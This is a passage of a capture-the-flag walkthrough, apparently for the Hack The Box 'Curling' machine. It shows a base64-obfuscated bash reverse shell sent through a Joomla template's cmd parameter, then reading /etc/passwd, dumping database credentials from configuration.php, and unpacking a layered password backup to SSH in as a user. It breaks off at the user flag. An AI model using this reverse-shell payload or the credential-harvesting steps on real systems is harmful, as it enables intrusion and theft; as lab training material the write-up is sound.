href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F7e0d44a8-1cc4-4674-87c1-5254ccbb7b8b%2FUntitled.png?width=746&amp;table=block&amp;id=c9a9864e-9d9f-42b0-82d4-199acb71ac92"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F7e0d44a8-1cc4-4674-87c1-5254ccbb7b8b%2FUntitled.png?width=746&amp;table=block&amp;id=c9a9864e-9d9f-42b0-82d4-199acb71ac92" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/996b6869ac2c4262b45ca2d1be818dd7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Sending the following request would return a shell back to my listener.</span></span></p></div><pre id="https://www.notion.so/30d2b14f01e64584bb36f74e7b6544b1" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>http://10.129.12.187/templates/beez3/error.php?cmd=echo%20L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjYxLzgwMDEgMD4mMQ==%20|%20base64%20-d%20|%20bash</span></span></span></code></pre><div id="https://www.notion.so/6d248db580c74c30a523e8a4091ae02e" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ff50a8265-02e1-4596-9342-94d75abd0899%2FUntitled.png?width=801&amp;table=block&amp;id=6d248db5-80c7-4c30-a523-e8a4091ae02e"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ff50a8265-02e1-4596-9342-94d75abd0899%2FUntitled.png?width=801&amp;table=block&amp;id=6d248db5-80c7-4c30-a523-e8a4091ae02e" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/5341def6fe494a33979edb2a33bcd4a1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’m now on the box as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">www-data</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/d7ece6a5faa84eaea13a2a813b03601f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>www-data@curling:/$</span></mark></span><span class="SemanticString"><span> id

uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span></span></code></pre><div id="https://www.notion.so/7a5b438658c3478d8403a538816e80e3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/e1f10bf169ed4f24a12ddd3b9815f7d4" class="Divider"></div><h3 id="https://www.notion.so/6f78bdbd4fcc44f287b503ff31951146" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/6f78bdbd4fcc44f287b503ff31951146"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">www-data</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/65a2b15b45e24a4f9f5bda5673a8da0a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Checking </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/passwd</code></span><span class="SemanticString">, I find one console user: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">floris</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/d9352c2a06724e2789eb8e5ccefb12eb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>www-data@curling:/$</span></mark></span><span class="SemanticString"><span> cat /etc/passwd | grep -v nologin | grep -v false

root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
floris:x:1000:1004:floris:/home/floris:/bin/bash</span></span></span></code></pre><div id="https://www.notion.so/93466534b35546c599dc3f95009de0b0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/616723b84f614e9e9c9de6602e18f944" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Source Code:</strong></span></span></p></div><div id="https://www.notion.so/6a6c03afe34148a48c60104b44468a72" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Database credentials are also found in Joomla’s configuration PHP file.</span></span></p></div><pre id="https://www.notion.so/e1988a439d48436fa290b2a368b1be2e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">JConfig</span> <span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token variable">$offline</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$offline_message</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'This site is down for maintenance.&lt;br />Please check back again soon.'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$display_offline_message</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$offline_image</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$sitename</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Cewl Curling site!'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$editor</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'tinymce'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$captcha</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$list_limit</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'20'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$access</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$debug</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$debug_lang</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$dbtype</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'mysqli'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'floris'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'mYsQ!P4ssw0rd$yea!'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Joombla'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$dbprefix</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'eslfu_'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$live_site</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'VGQ09exHr8W2leID'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$gzip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$error_reporting</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'default'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$helpurl</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&amp;lang={langcode}'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$ftp_host</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$ftp_port</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'21'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$ftp_user</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$ftp_pass</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
  <span class="token operator">&lt;</span><span class="token operator">.</span><span class="token operator">.</span><span class="token constant">SNIP</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">></span>
<span class="token punctuation">}</span></span></span></span></span></code></pre><div id="https://www.notion.so/597de323585a4e088d2351091131da63" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I can enumerate the MySQL database with these creds, but there’s nothing inside.</span></span></p></div><div id="https://www.notion.so/86c10a9111f248c48ec636cc7309b0c5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/bff323a7f72849fda528285a9c0f0c31" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">/home/floris/</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><pre id="https://www.notion.so/ce55f23f63b842709853a987294e691a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>www-data@curling:/home/floris$</span></mark></span><span class="SemanticString"><span> ls -la

total 44
drwxr-xr-x 6 floris floris 4096 Aug  2  2022 .
drwxr-xr-x 3 root   root   4096 Aug  2  2022 ..
lrwxrwxrwx 1 root   root      9 May 22  2018 .bash_history -&gt; /dev/null
-rw-r--r-- 1 floris floris  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 floris floris 3771 Apr  4  2018 .bashrc
drwx------ 2 floris floris 4096 Aug  2  2022 .cache
drwx------ 3 floris floris 4096 Aug  2  2022 .gnupg
drwxrwxr-x 3 floris floris 4096 Aug  2  2022 .local
-rw-r--r-- 1 floris floris  807 Apr  4  2018 .profile
drwxr-x--- 2 root   floris 4096 Aug  2  2022 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 Feb  6 11:42 user.txt</span></span></span></code></pre><div id="https://www.notion.so/72210713ace841e79f3e2a446b2af282" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The user flag can be found in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">floris</code></span><span class="SemanticString">&#x27;s home directory, as well as a folder called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">admin-area</code></span><span class="SemanticString">. Neither of which can be accessed by the current user.</span></span></p></div><div id="https://www.notion.so/261657c5a00d4afbb38ed085c3c1655b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There is, however, a readable file called </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">password_backup</code></span><span class="SemanticString"> that contains what looks like a hexdump output from </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.tutorialspoint.com/unix_commands/xxd.htm">xxd</a></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/f0792f97a21b4476a4addf3f183331fb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&amp;SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..&lt;~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .&gt;...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s.&quot;
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48</span></span></span></code></pre><div id="https://www.notion.so/6ab764f5b9984f85943aafbda279f725" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/60e0b0faa6ab4c278b862140c600f66a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Password Backup Recovery:</strong></span></span></p></div><div id="https://www.notion.so/7ae30854ba8c44eeba500ac865ebdc85" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll use the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-r</code></span><span class="SemanticString"> option to revert the hexdump back to its original binary format. Running </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">file</code></span><span class="SemanticString"> on it reveals that the binary is </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">bzip2</code></span><span class="SemanticString"> compressed data.</span></span></p></div><pre id="https://www.notion.so/4d77476247de40569d14654517e513e4" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/post-exploitation]
└─$</span></mark></span><span class="SemanticString"><span> cat password_backup | xxd -r &gt; password.bin

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/post-exploitation]
└─$</span></mark></span><span class="SemanticString"><span> file password.bin

password.bin: bzip2 compressed data, block size = 900k</span></span></span></code></pre><div id="https://www.notion.so/9fc86e614ba64248be1d94fa3c81ad49" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Decompressing it generates </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">password.bin.out</code></span><span class="SemanticString">, which is another compressed file, this time in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gzip</code></span><span class="SemanticString"> format.</span></span></p></div><pre id="https://www.notion.so/0252f11386054efbb11c5a3735d3b729" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/post-exploitation]
└─$</span></mark></span><span class="SemanticString"><span> bzip2 -d password.bin 

bzip2: Can&#x27;t guess original name for password.bin -- using password.bin.out

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/post-exploitation]
└─$</span></mark></span><span class="SemanticString"><span> file password.bin.out

password.bin.out: gzip compressed data, was &quot;password&quot;, last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141</span></span></span></code></pre><div id="https://www.notion.so/ef57deba93cc4026a9ba560373e26011" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll rename the file so that it has a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">.gz</code></span><span class="SemanticString"> suffix, then decompress again. This results in another </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">bzip2</code></span><span class="SemanticString"> file.</span></span></p></div><pre id="https://www.notion.so/c66399c11b934a448b751393afc58caa" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/post-exploitation]
└─$</span></mark></span><span class="SemanticString"><span> mv password.bin.out password.bin.gz

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/post-exploitation]
└─$</span></mark></span><span class="SemanticString"><span> gzip -d password.bin.gz                          

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/post-exploitation]
└─$</span></mark></span><span class="SemanticString"><span> ls -la

total 16
drwxr-xr-x 2 ch3ng ch3ng 4096 Feb  7 00:25 .
drwxr-xr-x 6 ch3ng ch3ng 4096 Feb  6 22:11 ..
-rw-r--r-- 1 ch3ng ch3ng 1040 Feb  7 00:01 password_backup
-rw-r--r-- 1 ch3ng ch3ng 141 Feb  7 00:21 password.bin

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/post-exploitation]
└─$</span></mark></span><span class="SemanticString"><span> file password.bin  
   
password.bin: bzip2 compressed data, block size = 900k</span></span></span></code></pre><div id="https://www.notion.so/c0ed8b2686bc445cabb0aa47ec6e8cda" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Decompressing again, this time I get a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">tar</code></span><span class="SemanticString"> archive.</span></span></p></div><pre id="https://www.notion.so/5a04e3b2fb7040c390cc6dfe4bf4e0e8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/post-exploitation]
└─$</span></mark></span><span class="SemanticString"><span> bzip2 -d password.bin 

bzip2: Can&#x27;t guess original name for password.bin -- using password.bin.out

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/post-exploitation]
└─$</span></mark></span><span class="SemanticString"><span> file password.bin.out 

password.bin.out: POSIX tar archive (GNU)</span></span></span></code></pre><div id="https://www.notion.so/f854d0375e70413fb8fcc35c4ec461b3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Finally, decompressing this results in a human-readable text file, which contains the password.</span></span></p></div><pre id="https://www.notion.so/37cdc3d6b0524a60b7428cb05653709d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/post-exploitation]
└─$</span></mark></span><span class="SemanticString"><span> tar -xvf password.bin.out 

password.txt

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/curling/post-exploitation]
└─$</span></mark></span><span class="SemanticString"><span> cat password.txt 

5d&lt;wdCbdZu)|hChXll</span></span></span></code></pre><div id="https://www.notion.so/ef73071b1a2941d9806ff7ba127a724c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">If you prefer not to deal with the hassle of manually decompressing files in the terminal, </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://gchq.github.io/CyberChef/#recipe=From_Hexdump()Bzip2_Decompress(false)Gunzip()Bzip2_Decompress(false)Untar()&amp;input=MDAwMDAwMDA6IDQyNWEgNjgzOSAzMTQxIDU5MjYgNTM1OSA4MTliIGJiNDggMDAwMCAgQlpoOTFBWSZTWS4uLkguLg0KMDAwMDAwMTA6IDE3ZmYgZmZmYyA0MWNmIDA1ZjkgNTAyOSA2MTc2IDYxY2MgM2EzNCAgLi4uLkEuLi5QKWF2YS46NA0KMDAwMDAwMjA6IDRlZGMgY2NjYyA2ZTExIDU0MDAgMjNhYiA0MDI1IGY4MDIgMTk2MCAgTi4uLm4uVC4jLkAlLi4uYA0KMDAwMDAwMzA6IDIwMTggMGNhMCAwMDkyIDFjN2EgODM0MCAwMDAwIDAwMDAgMDAwMCAgIC4uLi4uLnouQC4uLi4uLg0KMDAwMDAwNDA6IDA2ODAgNjk4OCAzNDY4IDY0NjkgODlhNiBkNDM5IGVhNjggYzgwMCAgLi5pLjRoZGkuLi45LmguLg0KMDAwMDAwNTA6IDAwMGYgNTFhMCAwMDY0IDY4MWEgMDY5ZSBhMTkwIDAwMDAgMDAzNCAgLi5RLi5kaC4uLi4uLi4uNA0KMDAwMDAwNjA6IDY5MDAgMDc4MSAzNTAxIDZlMTggYzJkNyA4Yzk4IDg3NGEgMTNhMCAgaS4uLjUubi4uLi4uLkouLg0KMDAwMDAwNzA6IDA4NjggYWUxOSBjMDJhIGIwYzEgN2Q3OSAyZWMyIDNjN2UgOWQ3OCAgLmguLi4qLi59eS4uPH4ueA0KMDAwMDAwODA6IGY1M2UgMDgwOSBmMDczIDU2NTQgYzI3YSA0ODg2IGRmYTIgZTkzMSAgLj4uLi5zVlQuekguLi4uMQ0KMDAwMDAwOTA6IGM4NTYgOTIxYiAxMjIxIDMzODUgNjA0NiBhMmRkIGMxNzMgMGQyMiAgLlYuLi4hMy5gRi4uLnMuIg0KMDAwMDAwYTA6IGI5OTYgNmVkNCAwY2RiIDg3MzcgNmEzYSA1OGVhIDY0MTEgNTI5MCAgLi5uLi4uLjdqOlguZC5SLg0KMDAwMDAwYjA6IGFkNmIgYjEyZiAwODEzIDgxMjAgODIwNSBhNWY1IDI5NzAgYzUwMyAgLmsuLy4uLiAuLi4uKXAuLg0KMDAwMDAwYzA6IDM3ZGIgYWIzYiBlMDAwIGVmODUgZjQzOSBhNDE0IDg4NTAgMTg0MyAgNy4uOy4uLi4uOS4uLlAuQw0KMDAwMDAwZDA6IDgyNTkgYmU1MCAwOTg2IDFlNDggNDJkNSAxM2VhIDFjMmEgMDk4YyAgLlkuUC4uLkhCLi4uLiouLg0KMDAwMDAwZTA6IDhhNDcgYWIxZCAyMGE3IDU1NDAgNzJmZiAxNzcyIDQ1MzggNTA5MCAgLkcuLiAuVUByLi5yRThQLg0KMDAwMDAwZjA6IDgxOWIgYmI0OA">CyberChef</a></span><span class="SemanticString"> is a really good tool to use here. It provides an easy way to handle these chains of decompression/decoding operations.</span></span></p></div><div id="https://www.notion.so/0039ae290e0e4f2b8819b147c418fd1d" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6dcb18ea-3cc2-477b-9c5c-56524bde234d%2FUntitled.png?width=3057&amp;table=block&amp;id=0039ae29-0e0e-4f2b-8819-b147c418fd1d"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6dcb18ea-3cc2-477b-9c5c-56524bde234d%2FUntitled.png?width=3057&amp;table=block&amp;id=0039ae29-0e0e-4f2b-8819-b147c418fd1d" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/d91b580b0a994f85a8b13551c6571c7d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the password, I can now SSH in as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">floris</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/ce7321e0f70144cfa7da42df8a006433" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F7407931b-69c8-44ed-beb3-a7354ca56582%2FUntitled.png?width=940&amp;table=block&amp;id=ce7321e0-f701-44cf-a7da-42df8a006433"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F7407931b-69c8-44ed-beb3-a7354ca56582%2FUntitled.png?width=940&amp;table=block&amp;id=ce7321e0-f701-44cf-a7da-42df8a006433" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><pre id="https://www.notion.so/581e8df2b5a045cbb9b05b234abdd334" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>floris@curling:~$</span></mark></span><span class="SemanticString"><span> id

uid=1000(floris) gid=1004(floris) groups=1004(floris)</span></span></span></code></pre><div id="https://www.notion.so/cc096467fa0d460f93c5b74b545fc20e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/79666bf98922475d8a6a64d8bcbb8742" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/57d25ddeb1ed45e09ce2a571c4050a50" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>floris@curling:~$</span></mark></span><span class="SemanticString"><span> cat user.txt

